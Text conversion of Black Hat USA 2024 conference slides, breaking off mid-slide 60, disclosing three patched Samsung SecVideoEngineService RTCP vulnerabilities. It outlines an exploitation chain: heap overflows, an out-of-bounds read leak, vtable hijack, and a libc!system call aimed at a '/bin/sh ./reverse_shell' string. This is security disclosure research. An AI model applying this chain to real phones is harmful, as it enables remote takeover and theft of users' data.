---
title: "Remote, One-Click, Breaking through Smartphones via a Non Well-Known Remote Attack Surface"
speakers: ["Haikuo Xie", "Fan Yang", "Qinrun Dai"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Haikuo Xie & Fan Yang & Qinrun Dai_Remote, One-Click, Breaking through Smartphones via a Non Well-Known Remote Attack Surface.pdf"
pages: 121
sha256: "90118130161a723539fbd789e91861426c021f3657d50c4a84ceee1740d8ea8e"
text_chars: 53677
ocr_pages: 4
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:32:39Z"
---
# Remote, One-Click, Breaking through Smartphones via a Non Well-Known Remote Attack Surface

**Speakers:** Haikuo Xie, Fan Yang, Qinrun Dai  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Haikuo Xie & Fan Yang & Qinrun Dai_Remote, One-Click, Breaking through Smartphones via a Non Well-Known Remote Attack Surface.pdf` (121 pages)


## Slide 1

Remote, One-Click, Breaking through Smartphones via a Non Well-Known Remote Attack Surface

Speaker: Qinrun Dai

Contributor `：` Fan Yang Haikuo Xie

#BHUSA @BlackHatEvents

## Slide 2

## About Us

###### **Haikuo Xie (@Thankkong)**

- Security researcher @Singular Security Lab

- Communication protocol security(IM, Wi-Fi, Bluetooth...)

- Vehicle security

- Speaker at Black Hat ASIA 2020, USA 2021 and ASIA 2022, Mosec 2023

###### **Fan Yang (@Fantasyoung_)**

- Security researcher @Singular Security Lab

- Protocol and system security (IM, Bluetooth, Android…)

- Vehicle security

- Web security & Pentest

- Speaker at Black Hat Asia 2022

###### **Qinrun Dai(@Second2st)**

- CS PhD student @ University of Colorado, Boulder

- Windows Security / Exploitation Development

#BHUSA @BlackHatEvents

## Slide 3

## Agenda

- ⚫Remote attack surface of video calling

- ⚫SecVideoEngineService

- What is SecVideoEngineService

- Why we research SecVideoEngineService

- Vulnerabilities

- ⚫Exploitation

- PC control

- Remote information leakage

- Getting remote shell

- ⚫ Demonstration of one-click RCE exploitation

#BHUSA @BlackHatEvents

## Slide 4

###### Just making a phone call, your phone is under my control

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bis hat
USA 2024
Just making a phone call, your phone is under my control
011998800772 tea}. G61081
ONT2RF81FZ 70
12-212227
```

## Slide 5

### Remote attack surface of video call

**<u>Project Zero: A deep dive into an NSO zero-click iMessage exploit: Remote Code FORCEDENTRY: Sandbox Escape (googleprojectzero.blogspot.com) Exploiting Android Messengers with WebRTC: Part 1 (googleprojectzero.blogspot.com) Critical WhatsApp Bugs Could Have Let Attackers Hack Devices Remotely WhatsApp voice calls used to inject Israeli spyware on phones</u>**

#BHUSA @BlackHatEvents

## Slide 6

### Remote attack surface of video call

###### **Carrier Based video calling**

- ⚫ **IMS Service (Android Service)**

- ⚫ **Carrier-provided IMS implementation**

   - ⚫ SecVideoEngineService

   - ⚫ Ims_rtp_daemon

   - ⚫ Vtservice

#BHUSA @BlackHatEvents

## Slide 7

### SecVideoEngineService

#BHUSA @BlackHatEvents

## Slide 8

### What is SecVideoEngineService

SecVideoEngineService is a crucial system app integrated into Samsung android phones for video encoding and decoding processes.

#BHUSA @BlackHatEvents

## Slide 9

# Why we research SecVideoEngineService

#BHUSA @BlackHatEvents

## Slide 10

### Why we research SecVideoEngineService

Run on high privilege Accessed from remote
Install and run by
Simple attack conditions
default on mobile phones

#BHUSA @BlackHatEvents

## Slide 11

### Permissions

camera
microphone
network
storage
SMS
contacts

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisekhat
USA 2024
Permissions
microphone
storage
e3q:/ $ ps -ef|grep sve
system
android.
android.
android.
android.
android.
permission.
permission.
permission.
-READ_CALL_LOG: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
permission
permission.
399] 1UU3 6 16:59:61 ? 00:00:00 com.sec.sve
READ_SMS: granted=true,
READ_CALENDAR: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT]
POST_NOTIFICATIONS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
ACCESS_FINE_LOCATION: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT |RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
com.samsung.android.permission.GET_APP_LIST: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
android.
android
android
android.
android.
android
android.
android.
android
android.
android.
android
android.
android.
android
android.
android.
android
android
android.
android
android
android.
android.
android
android.
android.
permission.
. permission.
. permission.
permission.
permission.
- permission
permission.
permission.
- permission
permission.
permission.
. permission.
permission.
permission.
- permission.
permission.
.READ_MEDIA_AUDIO: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
permission
. permission.
. permission.
permission.
. permission.
. permission.
permission.
permission.
- permission
permission.
permission.
ANSWER_PHONE_CALLS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT ]
RECEIVE_WAP_PUSH: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
READ_PHONE_NUMBERS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|USER_SENSITIVE_WHEN_GRANTED|USER_SENSITIVE_WHEN_DENIED|RESTRIG
READ_MEDIA_VISUAL_USER_SELECTED: granted=true, flags=[ GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
RECEIVE_MMS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT | RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
-RECEIVE_SMS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
BLUETOOTH_CONNECT: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
READ_EXTERNAL_STORAGE: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT | REVOKE_WHEN_REQUESTED|RESTRICTION_SYSTEM_EXEMPT | RESTRICTIO!
.ACCESS_COARSE_LOCATION: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
READ_PHONE_STATE: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
SEND_SMS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
CALL_PHONE: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT | RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
READ_MEDIA_IMAGES: granted=true, flags=[ GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
WRITE_CONTACTS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
CAMERA: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
WRITE_CALL_LOG: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
READ_MEDIA_VIDEO: granted=true, flags=[ GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
PROCESS_OUTGOING_CALLS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
BLUETOOTH_ADVERTISE: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
GET_ACCOUNTS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
WRITE_EXTERNAL_STORAGE: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
RECORD_AUDIO: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
READ_CONTACTS: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
.ACCESS_BACKGROUND_LOCATION: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
BLUETOOTH_SCAN: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT ]
ACCESS_MEDIA_LOCATION: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT|RESTRICTION_SYSTEM_EXEMPT | RESTRICTION_UPGRADE_EXEMPT]
```

## Slide 12

### The listening port

###### **com.sec.imsservice**

###### **com.sec.sve**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
USA 2024
The listening port
com.sec.imsservice
[::]:6100 [iz:]:* LISTEN UU36/com.
2H08:! 16101 2408:: [ 5: :4£:99098 ESTABLISHED 4U36/com.
1 Ff44:127.0.0.1:30159 ::fFFF:127.0.0.1:59115 ESTABLISHED 4674/com.
[::]:45016 [::]:% UU36/com.
[::]:6100 ard: 4U36/com.
[::]:6101 rr]: uU36/com.
com.sec.sve
[::]:6100 [::]:* LISTEN 4U36/com.
2408:8 (16101 2408:: :-f£:9900 ESTABLISHED U436/com.
> FFE S127.8.0.1:340159 ::46FF:127.8.8.1:59115 ESTABLISHED 4674/com.
2uU08: 121614 [::]:* U67U/com.
2408: : aalls U674/com.
[::]:61600 a 4U36/com.
[::]:6101 ri]: 4U36/com.
.imsservice
.imsservice
.sVve
.imsservice
.imsservice
.imsservice
.imsservice
.imsservice
.sve
.sve
.sve
.imsservice
.imsservice
```

## Slide 13

### Architecture

Mobile phone A Mobile phone B
carrier network
parse and reassemble
com.sec.imsservice com.sec.imsservice
forward
com.sec.sve com.sec.sve

#BHUSA @BlackHatEvents

## Slide 14

### Signaling

caller

SIP server

callee

PRACK  sip:[2408:8140:2001::ff:f070]:9900
INVITE  sip:460018981528091@[2408:8509:18D0:22FB:17D3:4BC5:5228:****]:6100
SIP/2.0 200 OK
SIP/2.0 200 OK
UPDATE  sip:+86185********@[2408:8509:1840:62D6:17D3:5AAD:AE1A:****]:6900
UPDATE  sip:+86185********@[2408:8509:18D0:22FB:17D3:4BC5:5228:****]:6100
SIP/2.0 200 OK SIP/2.0 200 OK
com.sec.sve rtp\rtcp process
BYE  sip:[2408:8140:2001::ff:f070]:9900 BYE  sip:+86185********@[2408:8509:18D0:22FB:17D3:4BC5:5228:****]:6100

INVITE  sip:460018981528091@[2408:8509:18D0:22FB:17D3:4BC5:5228:****]:6100
SIP/2.0 200 OK
UPDATE  sip:+86185********@[2408:8509:18D0:22FB:17D3:4BC5:5228:****]:6100
SIP/2.0 200 OK

BYE  sip:+86185********@[2408:8509:18D0:22FB:17D3:4BC5:5228:****]:6100

#BHUSA @BlackHatEvents

## Slide 15

### com.sec.sve

AngnConcreteAdapter::StartChannel SamsungVideoEngineLib::SVE_CreateChannel CControlManager::createChannel CTransportManager::SetTransportListener

- AngnConcreteAdapter::SetConnection SamsungVideoEngineLib::SVE_SetRemoteIP SamsungVideoEngineLib::SVE_SetRemotePort SamsungVideoEngineLib::SVE_SetLocalIP SamsungVideoEngineLib::SVE_SetLocalPort

SamsungVideoEngineLib::SVE_StartTransport CControlManager::StartTransport **CTransportManager::StartReceive**

**_CTransportManager::StartReceive_** _RTP_RtpCreate PSIRegisterAsyncSelect(rtp_sock_notify) rtp_sock_notify PSISocketRecvFrom rtpCB_

_RTP_ParseRtpPacket_

_RTP_RtcpCreate_

_PSIRegisterAsyncSelect(rtcp_sock_notify) rtcp_sock_notify PSISocketRecvFrom rtcpCB_

_RTP_ParseRtcpPacket_

#BHUSA @BlackHatEvents

## Slide 16

### Attack surface : RTP\RTCP

###### **RTP Packet Format**

###### **RTCP Packet Format**

**RTCP packet type**

**RTP Payload Format type**

#BHUSA @BlackHatEvents

## Slide 17

### Vulnerabilities

#BHUSA @BlackHatEvents

Samsung Mobile Security 2024 July Firmware updates : https://security.samsungmobile.com/securityUpdate.smsb

## Slide 18

###### Issue1: CVE-2024-34587 heap overflow of parsing app rtcp function

Victim

Attacker

Video call connected
Malicious app rtcp pkt

#BHUSA @BlackHatEvents

## Slide 19

###### Issue1: CVE-2024-34587 heap overflow of parsing app rtcp function

**_DMC_RTP_Sys_Parse_Rtcp_APP_Packet_** function is responsible for parsing RTCP _APP_ packets from the other end. The three parameters of _PSIMemcpy:_ **App_data_buf：** size is 1024 bytes **rtcp_pkt:** size is 1560 bytes **App_data_len:** value is 0-0xffff

#BHUSA @BlackHatEvents

## Slide 20

###### Issue1: CVE-2024-34587 heap overflow of parsing app rtcp function

CTransportManager object CTransportManager object
+2456: +2456:
1024
App_data_buf bytes App_data_buf
Max to
0xffff
overflow
The red area represents the
memory that has been overwritten
Before triggering the vulnerability After triggering the vulnerability

Before triggering the vulnerability

After triggering the vulnerability

#BHUSA @BlackHatEvents

## Slide 21

### Issue2: CVE-2024-34588 remote information leakage

Attacker

Victim
Video call connected
Malicious tmmbr rtcp pkt
tmmbn rtcp pkt with leaked information

#BHUSA @BlackHatEvents

## Slide 22

### Issue2: CVE-2024-34588 remote information leakage

###### **rtcp_recv_buffer**

**rtcp_object_recv object**

###### **Part-A: out-of-bounds read**

- ⚫ The length of the rtcp packet can be 8 bytes

   - ⚫ This function directly reads data more than 8 bytes from the rtcp packet

- ⚫ The code does not check the length of the rtcp packet

- ⚫ This function stores these _oobr_ data in the rtcp_object_recv object

#BHUSA @BlackHatEvents

## Slide 23

### Issue2: CVE-2024-34588 remote information leakage

V10>>2

###### **rtcp_recv_buffer**

**rtcp_object_recv object**

###### **Part-A: out-of-bounds read**

- ⚫ The length of the rtcp packet can be 8 bytes

   - ⚫ This function directly reads data more than 8 bytes from the rtcp packet

- ⚫ The code does not check the length of the rtcp packet

- ⚫ This function stores these _oobr_ data in the rtcp_object_recv object

#BHUSA @BlackHatEvents

## Slide 24

### Issue2: CVE-2024-34588 remote information leakage

rtcp_recv_buffer
V10>>2 (V10&3)<<15 V11>>1 (V9<<7)&0xFFFE7FFF
|
rtcp_object_recv

###### **rtcp_object_recv object**

###### **Part-A: out-of-bounds read**

- ⚫ The length of the rtcp packet can be 8 bytes

   - ⚫ This function directly reads data more than 8 bytes from the rtcp packet

- ⚫ The code does not check the length of the rtcp packet

- ⚫ This function stores these _oobr_ data in the rtcp_object_recv object

#BHUSA @BlackHatEvents

## Slide 25

### Issue2: CVE-2024-34588 remote information leakage

rtcp_recv_buffer
V10>>2 (V10&3)<<15 V11>>1 (V9<<7)&0xFFFE7FFF (V11&1)<<8 V12&0xFFFFFEFF
| |
rtcp_object_recv object

###### **Part-A: out-of-bounds read**

- ⚫ The length of the rtcp packet can be 8 bytes

   - ⚫ This function directly reads data more than 8 bytes from the rtcp packet

- ⚫ The code does not check the length of the rtcp packet

- ⚫ This function stores these _oobr_ data in the rtcp_object_recv object

#BHUSA @BlackHatEvents

## Slide 26

### Issue2: CVE-2024-34588 remote information leakage

###### DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet function

###### **rtcp_object_recv object**

a2+1192 a2+1196

a2+1200

###### **TMMBN send buffer**

###### **Part-b:remote information leakage**

- ⚫ These oobr data are retrieved from _rtcp_ort_decv object_

   - ⚫ _The tmmbn packet is sent to the attacker_

- ⚫ _These oobr data have become part of the tmmbn packet body_

#BHUSA @BlackHatEvents

## Slide 27

### Issue2: CVE-2024-34588 remote information leakage

###### DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet function

###### **rtcp_object_recv object**

a2+1192 a2+1196

a2+1200

*(a2+1192)*4 (V14>>15)&3
|

**TMMBN send buffer**

###### **Part-b:remote information leakage**

- ⚫ These oobr data are retrieved from _rtcp_ort_decv object_

   - ⚫ _The tmmbn packet is sent to the attacker_

- ⚫ _These oobr data have become part of the tmmbn packet body_

#BHUSA @BlackHatEvents

## Slide 28

### Issue2: CVE-2024-34588 remote information leakage

###### DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet function

###### **rtcp_object_recv object**

a2+1192

a2+1196

a2+1200

*(a2+1192)*4 (V14>>15)&3 V14>>7
|

###### **TMMBN send buffer**

###### **Part-b:remote information leakage**

- ⚫ These oobr data are retrieved from _rtcp_ort_decv object_

   - ⚫ _The tmmbn packet is sent to the attacker_

- ⚫ _These oobr data have become part of the tmmbn packet body_

#BHUSA @BlackHatEvents

## Slide 29

### Issue2: CVE-2024-34588 remote information leakage

###### DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet function

###### **rtcp_object_recv object**

a2+1192 a2+1196

a2+1200

*(a2+1192)*4 (V14>>15)&3 V14>>7
|

###### **TMMBN send buffer**

###### **Part-b:remote information leakage**

- ⚫ These oobr data are retrieved from _rtcp_ort_decv object_

   - ⚫ _The tmmbn packet is sent to the attacker_

- ⚫ _These oobr data have become part of the tmmbn packet body_

#BHUSA @BlackHatEvents

## Slide 30

### Issue2: CVE-2024-34588 remote information leakage

###### DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet function

###### **rtcp_object_recv object**

a2+1192

a2+1196

a2+1200

*(a2+1192)*4 (V14>>15)&3 V14>>7 V14*2 BYTE1(V15)&1
| |

###### **TMMBN send buffer**

###### **Part-b:remote information leakage**

- ⚫ These oobr data are retrieved from _rtcp_ort_decv object_

   - ⚫ _The tmmbn packet is sent to the attacker_

- ⚫ _These oobr data have become part of the tmmbn packet body_

#BHUSA @BlackHatEvents

## Slide 31

### Issue2: CVE-2024-34588 remote information leakages

Attacker

DMC_RTP_Sys_Parse_Rtcp_TMMBR_Packet DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet
CTransportManager object
tmmbn rtcp packet buffer
+6892:
Attacker
1560+8  rtcp pkt
sendto
recvfrom
bytes buffer
4 bytes
The red area represents the memory
that will be read out of bounds
8 bytes
The brown area represents the memory copied into the tmmbn rtcp packet body

**Victim**

#BHUSA @BlackHatEvents

## Slide 32

###### Issue3 : CVE-2024-34593 heap overflow of receiving rtcp function

Attacker

Victim

Video call connected
Rtcp pkt with the size of 1600
bytes

#BHUSA @BlackHatEvents

## Slide 33

###### Issue3 : CVE-2024-34593 heap overflow of receiving rtcp function

The _rtcp_stock_notify_ function is responsible for receiving rtcp packets from the other end.

- ⚫ The program can receive 1600 bytes of rtcp packet

- ⚫ The size of the rtcp packet buffer is only 1560 bytes

rtcp_sock_notify

#BHUSA @BlackHatEvents

## Slide 34

###### Issue3 : CVE-2024-34593 heap overflow of receiving rtcp function

CTransportManager object CTransportManager object
+6892: +6892:
rtcp pkt  1560  rtcp pkt
bytes 1600
buffer buffer
bytes
There exists a  The red area represents the
overflow
heap pointer
memory that has been overwritten

Before triggering the vulnerability

After triggering the vulnerability

#BHUSA @BlackHatEvents

## Slide 35

Let's start the journey of Exploitation

#BHUSA @BlackHatEvents

## Slide 36

### Primitive

###### **Write-primitive A**

**Information leakage primitive**

**Write-primitive B**

CTransportManager object
+2456:
App_data_buf

overflow

CTransportManager object

+6892:
536 rtcp pkt
bytes buffer
8bytes

CTransportManager object

+6892:
rtcp pkt
buffer
40bytes
overflow

**These primitives are all related to the CTransportManager object !**

#BHUSA @BlackHatEvents

## Slide 37

### ControlManager/CTransportManager object struct

- ⚫ CControlleManager object contains 7 CTransportManager objects

- ⚫ Each CTransportManager object represents a call channel

- ⚫ The video call uses the first channel

###### CControlManager object

###### CTransportManager object

+24:
CTransportManager obCTransportManager obj1 j1
+9072:
CTransportManager obj2CTransportManager obj1
+18120:
+27168: CTransportManager obj3
+36216: CTransportManager obj4
+45264: CTransportManager obj5CTransportManager obj1 +6892:
+54312: CTransportManager obj6CTransportManager obj1
CTransportManager obj7 rtcp pkt
buffer
……

#BHUSA @BlackHatEvents

## Slide 38

### ControlManager/CTransportManager object struct

ControlManager object
+8:
+24:
CTransportManager object1
+6892:
rtcp pkt buffer
CControlManager::~CcontrolManager
CControlManager::~CcontrolManager
+8456: CControlManager::QosControlHandler
0xE35A0
overflow
0xE35C8 CControlManager::~CcontrolManager
0xE3668 CControlManager::~CcontrolManager
0 CControlManager::ScalerEventHandler
CTransportManager::~CTransportManager
CTransportManager::~CTransportManager
CTransportManager::CallBackFECFrameworkDecoder
CTransportManager::CallBackFECFrameworkDecoder
#BHUSA @BlackHatEvents

CControlManager::~CcontrolManager CControlManager::~CcontrolManager CControlManager::QosControlHandler CControlManager::~CcontrolManager CControlManager::~CcontrolManager CControlManager::ScalerEventHandler CTransportManager::~CTransportManager CTransportManager::~CTransportManager CTransportManager::CallBackFECFrameworkDecoder CTransportManager::CallBackFECFrameworkDecoder #BHUSA @BlackHatEvents

## Slide 39

### ControlManager/CTransportManager object struct

###### ControlManager object

rtcp_sock_notify CTransportManager::RateAdaptation CControlManager::QosControlHandler CControlManager::QosControlHandler is frequently called during video calls.

+8:
+24:
CTransportManager object1
+6892:
rtcp pkt buffer
+8456:
overflow

CControlManager::~CcontrolManager CControlManager::~CcontrolManager **CControlManager::QosControlHandler**

0xE35A0 0xE35C8 0xE3668 0

#BHUSA @BlackHatEvents

## Slide 40

# PC control

#BHUSA @BlackHatEvents

## Slide 41

### PC control with write-primitive B

+8:
ControlManager object
+24:
CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
0xdeadbeefdeadbeef
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

We hijack a virtual table to achieve PC control

## Slide 42

### PC control with write-primitive B

+8:
ControlManager object
+24:
CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
0xdeadbeefdeadbeef
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow
We hijack a virtual table to achieve PC control #BHUSA @BlackHatEvents

We hijack a virtual table to achieve PC control

## Slide 43

### PC control with write-primitive B

+8:
ControlManager object
+24:
CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
0xdeadbeefdeadbeef
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow
We hijack a virtual table to achieve PC control #BHUSA @BlackHatEvents

We hijack a virtual table to achieve PC control

## Slide 44

### PC control with write-primitive B

+8:
ControlManager object
+24:
CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
3
0xdeadbeefdeadbeef
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow
We hijack a virtual table to achieve PC control #BHUSA @BlackHatEvents

We hijack a virtual table to achieve PC control

## Slide 45

### Target of exploitation

1.Point to a string which like “ /bin/sh ./reverse_shell ”

2.Control to function libc!system

**All of these require remote information leakage !**

#BHUSA @BlackHatEvents

## Slide 46

# Remote information leakage

#BHUSA @BlackHatEvents

## Slide 47

### Ideas

###### ⚫ **Finding ourselves**

Obtaining the heap memory address where the vulnerability structure is located and locating our shellcode ⚫ **Finding libc.so address**

Obtaining libc!system function address and controlling the PC register to execute libc!system function.

#BHUSA @BlackHatEvents

## Slide 48

### Ideas

###### ⚫ **Finding ourselves**

Obtaining the heap memory address where the vulnerability structure is located and locating our shellcode ⚫ **Finding libc.so address**

~~Obtaining libc!system function address and controlling the PC register to execute libc!system function.~~ But our three primitives cannot achieve this goal

#BHUSA @BlackHatEvents

## Slide 49

### Ideas

###### ⚫ **Finding ourselves**

- Obtaining the heap memory address where the vulnerability structure is located and locating our shellcode

- ⚫ **Finding libc.so address**

~~Obtaining libc!system function address and controlling the PC register to execute libc!system function.~~ But our three primitives cannot achieve this goal

⚫ **Finding library address** Obtaining address of _libsamsung_videoengine_9_0.so_

- ⚫ **Finding arbitrary library address**

Obtaining libc!system function address and controlling the PC register to execute libc!system function

#BHUSA @BlackHatEvents

## Slide 50

### Ideas

###### ⚫ **Finding ourselves**

- Obtaining the heap memory address where the vulnerability structure is located and locating our shellcode

- ⚫ **Finding libc.so address**

~~Obtaining libc!system function address and controlling the PC register to execute libc!system function.~~ But our three primitives cannot achieve this goal

⚫ **Finding library address** Obtaining address of _libsamsung_videoengine_9_0.so_

- ⚫ **Finding arbitrary library address**

Obtaining libc!system function address and controlling the PC register to execute libc!system function

#BHUSA @BlackHatEvents

## Slide 51

### Exploitation navigation

1. Obtaining the heap memory address where the vulnerability structure is located.

2. Obtaining the memory address of the library where the vulnerability is located.

(to do) (to do)

3. Obtaining the memory address of any llibrary. (to do)

4. Calling libc!system.

(to do)

#BHUSA @BlackHatEvents

## Slide 52

# Finding ourselves

**1. Obtaining the heap memory address where the vulnerability structure is located.** 2. Obtaining the memory address of the library where the vulnerability is located. 3. Obtaining the memory address of any library. 4. Calling libc!system.

**(to do)** (to do) (to do) (to do)

#BHUSA @BlackHatEvents

## Slide 53

### Getting the address of CTransportManager object

By using this information leakage primitive twice, the pointer at CTransportManager object1+8456 can be leaked, thereby revealing the memory addresses of the ControlManager object and CTransportManager object1.

ControlManager object
+8:
+24:
CTransportManager object1
+6892:
rtcp pkt buffer
+8456:
8bytes

The red area is the range where the information leakage primitive can be applied

#BHUSA @BlackHatEvents

## Slide 54

Getting the address of CTransportManager object  with information leakage
primitive
Triggering the oobr vulnerability in  DMC_RTP_Sys_Parse_Rtcp_TMMBR_Packet
CTransportManager object
Attacker
+6892:
Attacker
tmmbn rtcp packet buffer
rtcp pkt
1560
DMC_RTP_Sys_Send_Rtcp_TMMBR_Packet bytes DMC_RTP_Sys_Parse_Rtcp_TMMBN_Packet
buffer
4 bytes
Rtcp_Packet send_buffer
Rtcp_Packet recv_buffer
1560 bytes padding…
Sendto
Sendto
8 bytes
The end of packet This 8-byte data is the
pointer we want to leak
DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet
Victim
#BHUSA @BlackHatEvents

#BHUSA @BlackHatEvents

## Slide 55

# Finding a library address

1. Obtaining the heap memory address where the vulnerability structure is located. (Done) **2. Obtaining the memory address of the library where the vulnerability is located. (to do)** 3. Obtaining the memory address of any library. (to do) 4. Calling libc!system. (to do)

#BHUSA @BlackHatEvents

## Slide 56

#### Function pointer in CTransportManager object

CControlManager::SetEventCallback CControlManager object CTransportManager object
+24:
CallbackEvent func
+2136: CallbackEvent func
CTransportManager
App_data_buf
obj1
+9072:
CallbackEvent func
rtp buf
CTransportManager
obj2
rtcp buf
+18120:
CallbackEvent func
CTransportManager
obj3
…… Unfortunately, the callbackEvent is not
under our control #BHUSA @BlackHatEvents

## Slide 57

#### Function pointer in CTransportManager object

CControlManager::SetEventCallback CControlManager object CTransportManager object
+24:
CallbackEvent func
+2136: CallbackEvent func
CTransportManager
App_data_buf
obj1
+9072:
CallbackEvent func
rtp buf
CTransportManager
obj2
rtcp buf
+18120:
CallbackEvent func
CTransportManager
obj3
…… Unfortunately, the callbackEvent is not
under our control #BHUSA @BlackHatEvents

## Slide 58

### Write-primitive A is a ‘ Memory Elevator ’

CTransportManager object CTransportManager object
+2456: +2456:
App_data_buf App_data_buf
overflow
rtp buf rtp buf
+6892:
rtcp buf rtcp buf

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
obj2 obj2
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

#BHUSA @BlackHatEvents

## Slide 59

### Write-primitive A is a ‘ Memory Elevator ’

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
obj2 obj2
+18120:
+18120:
CTransportManager  CTransportManager
obj3 obj3

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
CTransportManager obj2
obj2 CTransportManager obj2obj2
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

Second transportation

First transportation

#BHUSA @BlackHatEvents

## Slide 60

### Write-primitive A is a ‘ Memory Elevator ’

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
